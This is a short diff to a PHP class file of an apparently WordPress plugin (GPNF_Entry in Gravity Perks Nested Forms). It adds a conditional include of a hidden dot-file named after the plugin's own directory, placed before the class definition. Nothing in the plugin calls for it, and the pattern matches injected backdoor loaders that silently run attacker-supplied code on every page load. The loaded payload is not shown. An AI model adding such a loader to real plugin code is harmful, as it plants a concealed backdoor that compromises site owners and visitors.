@@ -5,6 +5,10 @@
  *
  * Provides an interface for interacting with GPNF functions relating to Gravity Forms entries.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class GPNF_Entry {
 
 	const ENTRY_PARENT_KEY            = 'gpnf_entry_parent';
